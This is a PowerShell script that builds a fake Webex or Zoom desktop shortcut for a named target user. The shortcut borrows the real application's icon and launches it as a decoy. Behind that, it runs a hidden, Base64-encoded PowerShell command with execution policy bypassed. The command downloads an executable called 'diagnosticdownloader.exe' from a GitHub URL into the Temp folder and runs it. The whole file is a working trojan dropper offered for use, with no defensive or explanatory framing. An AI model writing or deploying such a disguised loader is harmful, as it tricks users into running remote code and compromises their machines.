 param(
    [Parameter(Mandatory)]
    [ValidateSet("Webex", "Zoom")]
    [string]$DecoyLegitApp,
    
    [Parameter(Mandatory)]
    [string]$targetUsername
)
#set variables
$payloadName="diagnosticdownloader.exe"
$payloadURL="`"https://github.com/bsoroudi/easymoney/blob/updates/$($payloadName)?raw=true`""
$payloadPath="`"`$home\AppData\Local\Temp\$payloadName`""


switch ($DecoyLegitApp) {
    "Webex" {
        $DecoyLegitAppPath = "C:\Users\$targetUsername\AppData\Local\Programs\Cisco Spark\CiscoCollabHost.exe"
        $ShortcutFileName= "Webex.lnk"
    }
    "Zoom" {
        $DecoyLegitAppPath = "C:\Users\$targetUsername\AppData\Roaming\Zoom\bin\Zoom.exe"
        $ShortcutFileName= "Zoom Workspace.lnk"
    }
}


#encoded payload (don't edit)
$Payload = "start-process `"$DecoyLegitAppPath`"; (New-Object System.Net.WebClient).DownloadFile($payloadURL,$payloadPath); & $payloadPath"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$EncodedPayload =[Convert]::ToBase64String($Bytes)


#lnk file properties (don't edit)
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\$ShortcutFileName")
$ShortCut.WindowStyle = 7
$ShortCut.TargetPath = "powershell.exe"
$ShortCut.Arguments = "powershell.exe -ExecutionPolicy Bypass -noLogo -encodedcommand $EncodedPayload"
$ShortCut.IconLocation = "$DecoyLegitAppPath, 0";
$Shortcut.WorkingDirectory = "$(split-path $DecoyLegitAppPath)\"
$ShortCut.Description = "Type: Application";
$ShortCut.Save()